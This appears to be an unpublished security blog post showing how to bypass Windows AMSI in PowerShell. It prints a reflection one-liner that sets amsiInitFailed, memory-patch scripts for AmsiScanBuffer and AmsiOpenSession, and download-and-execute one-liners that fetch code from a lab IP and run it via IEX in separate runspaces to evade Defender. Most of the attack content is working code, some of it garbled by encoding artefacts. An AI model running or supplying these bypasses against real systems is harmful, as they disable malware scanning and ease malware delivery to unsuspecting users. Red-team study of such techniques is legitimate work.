---
published: false
---
## Bypassing AMSI like a Script Kiddie

### Introduction

Today I will share some of my findings from playing around with Antimalware
scan Interface (AMSI) on PowerShell.

<!--more-->

While taking Offensive Security's [PEN-300 course](
https://www.offensive-security.com/pen300-osep/) leading to the OSEP
certificate, I learned a fair bit about developping AMSI bypasses. WinDbg,
Frida, Initialization, Patching,... We did it all (see the [syllabus](
https://www.offensive-security.com/documentation/PEN300-Syllabus.pdf)).

On the other side, one of my classmates wondered why we bothered with all
those techniques when we can just concatenate some strings and not get
caught by AMSI.

While I disagree about not learning and understanding the advanced
techniques, I'd have to agree with them that AMSI appears to be pretty
trivial to bypass.

In this post, we will wear our script kiddie hat and download some AMSI
bypass scripts that have been publically available for years. Even though
they don't work anymore as is, we won't bother developping whole new ones.
We'll just make them work again with barely any modifications and without
needing to know what they do or how they work.

Eventually we will fall into a bit of a rabbit hole because a script kiddie
can still be curious and learn a little something.

We assume the reader is familiar with AMSI. We also won't be spending too
much time explaining how existing bypasses work, as there are plenty of
resources out there that do, including some linked here. Getting familiar
with the [Windows docs](
https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps) is also
a good idea.

In this post we will stay in the context of AMSI and PowerShell scripts.
Let's start our first full fledged bypass that our script kiddie finds...
in a tweet.

### The 140 character bypass

One of the first discovered bypasses was published by Matt Graeber in 2016
and could fit in a [single tweet](
https://twitter.com/mattifestation/status/735261120487772160), or 132
characters. It uses reflection to set amsiInitFailed to True, which
effectively turns off AMSI.

```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('=
amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Today, the 1-liner gets caught because strings such as 'AmsiUtils' and
'amsiInitFaled' are black listed by AMSI. This turned AMSI bypassing into a
bit of a cat and mouse game. [At some point](
https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasi=
on/
), it was possible to adapt this 1-liner just by splitting the blacklisted
strings, or switching from single quote to double quotes.

Today, a trivial combination of those two simple ideas still works. Still
under 140 characters! An 8 year old hacker could have come up with that.

```
[Ref].Assembly.GetType("System.Management.Automation.Amsi"+"Utils").GetFiel=
d("amsiInit"+"Failed","NonPublic,Static").SetValue($null,$true)
```

The screenshot below shows a blacklisted keyword getting caught by AMSI,
then our one-liner bypass, and the same keyword not getting caught anymore:


![image0.png]({{site.baseurl}}/_posts/images/image0.png)


### AMSIScanBuffer patch

[AMSIScanBuffer](
https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuf=
fer)
is the Windows API that scans content for malware and returns a result.

If we manage to patch the function, then none of our PowerShell commands
will get scanned and we can bypass AMSI.

Rasta Mouse [published](https://rastamouse.me/blog/asb-bypass-pt3/) such a
bypass in November 2018 ([source1](
https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/master/ASBBypass.p=
s1),
[source2](
https://github.com/webbie321/AmsiScanBufferBypass/blob/master/ASBBypass.ps1=
)).



```
$Win32 =3D @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string
procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr
dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary =3D [Win32]::LoadLibrary("am" + "si.dll")
$Address =3D [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffe=
r")
$p =3D 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch =3D [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

Note that the "Add-Type" technique is not the best if [trying to remain
stealthy](
https://www.redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypa=
ss),
but we will ignore that for today.

Let's try to run this .ps1 version on an up to date Windows 10 running
Windows Defender:

[image1]
![image1.png]({{site.baseurl}}/_posts/images/image1.png)


As hinted previously, the script now gets caught. We will focus on
"refreshing" it, with **zero modification** to the actual script, and just
a little bit of PowerShell magic.

Before we get started, this [blog post](
https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypas=
s-to-work-again/)
shows that it can be rewritten into a working bypass with a little bit of
effort. The result still works, six months later. But that's way too much
thinking for a script kiddie.

We can also obfuscate automatically our original script using [AMSI.fail](
https://amsi.fail/). This tool will alternate between obfuscation
techniques each time we run it. In my limited experience, we obtain an
undetected result less than 25% of the time when trying to obfuscate Rasta
Mouse's original script. It kinda passes the script kiddie threshold, but
it's also a bit too much trial and error.

Also, I question using third parties to obfuscate my scripts from a
security perspective.


### Splitting the Script


Let's get started with rejuvenating Rasta Mouses's bypass. We split our
script into three carefully chosen parts and run them on three different
prompts. We run a blacklisted keyword before and after.

![image2.png]({{site.baseurl}}/_posts/images/image2.png)


As shown above, the bypass doesn't get caught, and we successfully turn off
AMSI. Defender is triggered by the whole script but not by its individual
parts.

Not very useful if we just want a one liner, but bear with me.

#### Digging with Frida

Let's use [Frida](https://frida.re/) to check out what is happening under
the hood with the AMSI APIs, similarly to what is described in [this post](
https://www.contextis.com/en/blog/amsi-bypass). Having a [reference](
https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interf=
ace-functions)
to the different AMSI functions can be useful.

If we run two separate commands in separate PowerShell prompts, they get
scanned separately. More precisely we have two Scans, each happening in a
separate AMSI session. Let's demonstrate below.

Just showing relevant scans, this is what we observe:

![image3.png]({{site.baseurl}}/_posts/images/image3.png)

![image4.png]({{site.baseurl}}/_posts/images/image4.png)

![image5.png]({{site.baseurl}}/_posts/images/image5.png)


A simplified version is shown below:

```
AmsiOpenSession()
AmsiScanBuffer($first)
AmsiCloseSession()

AmsiOpenSession()
AmsiScanBuffer($second)
AmsiCloseSession()
```

So, when we ran the three parts of Rasta Mouse's script on different
prompts, the same thing happened. Each part got scanned separately, each in
their own AMSI session. None triggered AMSI individually, and Windows
Defender didn't somehow link the parts together.

#### Going for a one-liner

We're a bit unhappy with running our script manually, one chunk at a time
on the PowerShell GUI, so we will now work on getting it all on one prompt.

We save the 3 parts in different files (1/2/3), and we will run them in one
go using 3 download cradles. Works.
```
(New-Object Net.Webclient).downloadstring("
http://192.168.159.131/rastamouse/1.txt") | IEX;
(New-Object Net.Webclient).downloadstring("
http://192.168.159.131/rastamouse/2.txt") | IEX ;
(New-Object Net.Webclient).downloadstring("
http://192.168.159.131/rastamouse/3.txt") | IEX;
```

![image7.png]({{site.baseurl}}/_posts/images/image7.png)


However, downloading three separate files might not be desired.

So let's put the entire script in full.txt, use a download cradle to place
it into the $full string variable, and IEX 3 different substrings. Let's
break it down first:

Our full script is saved in variable $full:

![image8.png]({{site.baseurl}}/_posts/images/image8.png)


We break the scripts into 3 substrings using a little bit of character
counting:

![image9.png]({{site.baseurl}}/_posts/images/image9.png)


We will be running those substrings using IEX.

Let's combine everything and run the =E2=80=9C1 liner=E2=80=9D:

```
$full =3D (New-Object Net.Webclient).downloadstring("
http://192.168.159.131/rastamouse/full.txt"); IEX($full.substring(0,591));
IEX($full.substring(591,60)); IEX($full.substring(651,126))
```

![image10.png]({{site.baseurl}}/_posts/images/image10.png)


We now have a 1 liner that bypasses AMSI, with only 1 download and no
modifications to the original script.


#### Frida Again

Let's peek again, after running this last 1 liner.

![image11a.png]({{site.baseurl}}/_posts/images/image11a.png)

![image11b.png]({{site.baseurl}}/_posts/images/image11b.png)


A summary is below. Basically we scan the one-liner and the 3 script parts
individually, all in the same Amsi Session.

```
AmsiOpenSession

AmsiScanBuffer(1-liner)    >>amsiSession=3D0x231f

AmsiScanBuffer(part 1)     >>amsiSession=3D0x231f

--------------------- The two lines below don't seem relevant, but I'm note
sure why they are there.
AmsiInitialize

AmsiScanBuffer(stuff)      (different amsiContext and amsiSession)
----------------------

AmsiScanBuffer(part2)       >>amsiSession=3D0x231f

AmsiScanBuffer(part3)       >>amsiSession=3D0x231f


AmsiCloseSession
```

This iss similar to what was happening when we were running each chunk
separately on 3 different prompts.

However, there is one difference: they are all running in the same AMSI
session.

Our bypass works, so we could stop here and be satisfied with our working
result, or we could dig a bit deeper into AMSI sessions.


### AMSI Sessions

The [Microsoft Docs](
https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interf=
ace-portal)
give us the following information about AMSI Sessions:

"AMSI also supports the notion of a session so that antimalware vendors can
correlate different scan requests. For instance, the different fragments of
a malicious payload can be associated to reach a more informed decision,
which would be much harder to reach just by looking at those fragments in
isolation."

In our case, the 3 parts of the Rasta Mouse script are in 3 different
buffer scans, but in the same
AMSI session. And we know that the full script gets caught by Defender when
scanned in one go. So, if Defender had tried to =E2=80=9Ccorrelate=E2=80=9D=
, or even maybe
just concatenated the 3 strings that it is analyzing in the same session,
it would have caught our technique. But it didn't.

I applied the same =E2=80=9Csplitting the script=E2=80=9D technique to a Me=
terpreter
first-stage Powershell script, and again, Defender didn't seem to combine
the pieces (6-7 pieces in this case).

Therefore it seems that we have a "correlation" capability that Windows
Defender and AMSI aren't taking advantage of. Maybe other antimalware
vendors are using sessions? I haven't tested yet. If you know

Still, wouldn't it be interesting to bypass that capability just because we
can? This is our next section with Runspaces.

### Runspaces and Powershell objects (a.k.a. skid learns some PowerShell)

#### Quick intro to Powershell runspaces

"Runspaces are the enclosed area that the thread(s) running PowerShell
operate within. While the runspace that is used with the PowerShell console
is restricted to a single thread, you can use additional runspaces to allow
for use of additional threads" [(source)](
https://adamtheautomator.com/powershell-multithreading/#Runspaces_Kinda_Lik=
e_Jobs_but_Faster
)

In a penetration testing/red teaming context, Powershell runspace  has been
used to bypass applocker and CLM constrained language mode
https://www.redteam.cafe/red-team/powershell/powershell-custom-runspace

#### Using runspaces to split AMSI scans into multiple sessions

Here we are not really interested in multithreading, but into the
additional control runspaces give us. Our goal is to run individual
commands in their own AMSI session, as if we were running them one by one
in the Powershell GUI.

Below, we create a runspace instance $Runspace, as well two [powershell
instances](
https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.po=
wershell?view=3Dpowershellsdk-7.0.0)
$PowerShell1 and $PowerShell2, and link them to that same $Runspace (which
needs to be Open)

Powershell instances are commands or scripts that are executed against a
Runspace. Once created, we run them individually using the Invoke() method.

```
$Runspace =3D [runspacefactory]::CreateRunspace().Open()

$PowerShell1 =3D [powershell]::Create()
$PowerShell1.runspace =3D $Runspace
$PowerShell1.AddScript({$command1}).Invoke();

$PowerShell2 =3D [powershell]::Create()
$PowerShell2.runspace =3D $Runspace
$PowerShell2.AddScript({$command2}).Invoke();
```

We show that this allows us to run our commands in separate AMSI sessions.
Nice.

 ![image12.png]({{site.baseurl}}/_posts/images/image12.png)



Applying this to Rasta Mouse's script, we can adapt our code a bit to
shorten things. We reuse a single PowerShell instance and [clear its
commands](
https://stackoverflow.com/questions/25156868/remove-command-from-powershell=
-pipeline)
each time.

```
$Runspace =3D [runspacefactory]::CreateRunspace()
$Runspace.Open()

$PowerShell =3D [powershell]::Create()
$PowerShell.runspace =3D $Runspace
$PowerShell.AddScript({$full =3D (New-Object Net.Webclient).downloadstring(=
"
http://192.168.159.131/rastamouse/full.txt")}).Invoke();

$PowerShell.Commands.Clear()
$PowerShell.AddScript({IEX($full.substring(0,591))}).Invoke();

$PowerShell.Commands.Clear()
$PowerShell.AddScript({IEX($full.substring(591,60))}).Invoke();

$PowerShell.Commands.Clear()
$PowerShell.AddScript({IEX($full.substring(651,126))}).Invoke();
```

We end up with this long =E2=80=9C1-liner=E2=80=9D which downloads our AMSI=
 bypass script,
splits it up, and runs each part in separate AMSI sessions but in the same
runspace. Fantastic.

```
$Runspace =3D
[runspacefactory]::CreateRunspace();$Runspace.Open();$PowerShell =3D
[powershell]::Create();$PowerShell.runspace =3D
$Runspace;$PowerShell.AddScript({$full =3D (New-Object
Net.Webclient).downloadstring("http://192.168.159.131/rastamouse/full.txt")=
}).Invoke();$PowerShell.Commands.Clear()
;$PowerShell.AddScript({IEX($full.substring(0,591))}).Invoke();$PowerShell.=
Commands.Clear()
;$PowerShell.AddScript({IEX($full.substring(591,60))}).Invoke();$PowerShell=
.Commands.Clear()
;$PowerShell.AddScript({IEX($full.substring(651,126))}).Invoke();
```

### An actual case where we need separate AMSI sessions

#### Intro

In the last section, we responded to a =E2=80=9Cwhat-if=E2=80=9D scenario: =
a case where an
Antivirus actually correlates multiple buffers within one AMSI session.

Let's now look at a scenario where the runspace technique is actually
needed.

We go back to our original AmsiScanBuffer bypass, which ran Rasta Mouse's
script, split in 3 parts (we don't worry about AMSI sessions for now).

```
$full =3D (New-Object Net.Webclient).downloadstring("
http://192.168.159.131/rastamouse/full.txt"); IEX($full.substring(0,591));
IEX($full.substring(591,60)); IEX($full.substring(651,126))
```

Suppose we want to run a second, malicious script, that on its own gets
caught by AMSI. We will run it after our bypass, on the same prompt. For
our purposes, malicious.txt will just contain the very malicious
blacklisted string 'amsiutils' (with the single quotes). We add a download
cradle for malicious.txt.

```
$full =3D (New-Object Net.Webclient).downloadstring("
http://192.168.159.131/rastamouse/full.txt"); IEX($full.substring(0,591));
IEX($full.substring(591,60)); IEX($full.substring(651,126)); (New-Object
Net.Webclient).downloadstring("
http://192.168.159.131/rastamouse/malicious.txt")|IEX
```

It works.

![image14.png]({{site.baseurl}}/_posts/images/image14.png)


#### AmsiOpenSession patch

Now, let's create a new AMSI bypass script. Instead of patching
AmsiScanBuffer, we want to scan AmsiOpenSession. Since we're a script
kiddie, we'll just take the [AmsiScanBuffer script](
https://github.com/webbie321/AmsiScanBufferBypass/blob/master/ASBBypass.ps1=
)
by Rasta Mouse and replace the function name.


On line 22, we simply replace "Amsi" + "Scan" + "Buffer" by
"AmsiOpenSession"

No need to split the string anymore (for now) since this is a less popular
function to patch.

Full new script:

```
$Win32 =3D @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string
procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr
dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary =3D [Win32]::LoadLibrary("am" + "si.dll")
$Address =3D [Win32]::GetProcAddress($LoadLibrary, "AmsiOpenSession")
$p =3D 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch =3D [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

We still have to cut the script in 3, but, surprise, it works!

![image16.png]({{site.baseurl}}/_posts/images/image16.png)


We place the script in full2.txt, do a bit of character counting, and we're
back to where we were previously. Still works.

```
$full =3D (New-Object Net.Webclient).downloadstring("
http://192.168.159.131/rastamouse/full2.txt"); IEX($full.substring(0,583));
IEX($full.substring(583,60)); IEX($full.substring(643,126))
```

![image17.png]({{site.baseurl}}/_posts/images/image17.png)



We restart PowerShell, and now try to combine this bypass with our
malicious script, on the same line, as done earlier:

```
$full =3D (New-Object Net.Webclient).downloadstring("
http://192.168.159.131/rastamouse/full2.txt"); IEX($full.substring(0,583));
IEX($full.substring(583,60)); IEX($full.substring(643,126)); (New-Object
Net.Webclient).downloadstring("
http://192.168.159.131/rastamouse/malicious.txt")|IEX
```
![image18.png]({{site.baseurl}}/_posts/images/image18.png)


So what happened here? It looks like the bypass worked, since commands on
subsequent prompts don't get caught. However, our =E2=80=9Cmalicious=E2=80=
=9D script that
we tried to run on the same prompt as the bypass gets caught.

Remember that the exact same technique applied with an AmsiScanBuffer patch
worked fine.

Our problem here is that, although we patched AmsiOpenSession, our
malicious command is being run within the same AMSI session as the patch.
A simplified view of what happens behind the scenes is shown below:

```
AmsiOpenSession()

AmsiScanBuffer(1-liner)
AmsiScanBuffer(bypass part 1)
AmsiScanBuffer(bypass part 2)
AmsiScanBuffer(bypass part 3)
AmsiScanBuffer(malicious script)

AmsiCloseSession()
```


We don't run the patched AmsiOpenSession until the next prompt, which
explains why the bypass doesn't work for our malicious script but works
thereafter.

The solution is to use a Runspace to force a new AMSI session to open. The
script below is the same as prior, but using the AmsiOpenSession bypass,
and adding our malicious script.

```
$Runspace =3D [runspacefactory]::CreateRunspace()
$Runspace.Open()

$PowerShell =3D [powershell]::Create()
$PowerShell.runspace =3D $Runspace
$PowerShell.AddScript({$full =3D (New-Object Net.Webclient).downloadstring(=
"
http://192.168.159.131/rastamouse/full2.txt")}).Invoke();

$PowerShell.Commands.Clear()
$PowerShell.AddScript({IEX($full.substring(0,583))}).Invoke();

$PowerShell.Commands.Clear()
$PowerShell.AddScript({IEX($full.substring(583,60))}).Invoke();

$PowerShell.Commands.Clear()
$PowerShell.AddScript({IEX($full.substring(643,126))}).Invoke();

$PowerShell.Commands.Clear()
$PowerShell.AddScript({(New-Object Net.Webclient).downloadstring("
http://192.168.159.131/rastamouse/malicious.txt")|IEX}).Invoke();
```

Let's test it. Very nice!

![image19.png]({{site.baseurl}}/_posts/images/image19.png)



## Conclusion

Our imaginary script kiddie has made a little bit of progress since their
time of just modifying a short AMSI bypass tweet.

We demonstrated a script-splitting technique which reduces Windows
Defender's ability to make connections between different part of a script.

We also demonstrated a way to bypass what could be a potential future
mitigation to the script-splitting technique.

Finally, we showed how to succesfully attack the AmsiOpenSession function,
showing how to tackle a significant hurdle in the implementation of a
bypass.

I hope other security researchers will find some inspiration to dig
further, come up with new ideas, and share with the community.